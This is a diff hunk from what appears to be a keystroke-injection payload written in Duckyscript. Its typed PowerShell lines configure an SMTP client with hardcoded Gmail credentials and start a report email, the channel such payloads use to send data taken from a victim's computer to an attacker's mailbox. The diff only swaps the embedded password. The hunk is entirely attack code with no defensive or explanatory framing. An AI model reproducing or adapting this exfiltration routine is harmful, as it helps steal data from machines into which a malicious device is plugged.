@@ -45,7 +45,7 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nobody@googlemail.com', 'G00gle13$')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nobody@googlemail.com', 'n0ok14$')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
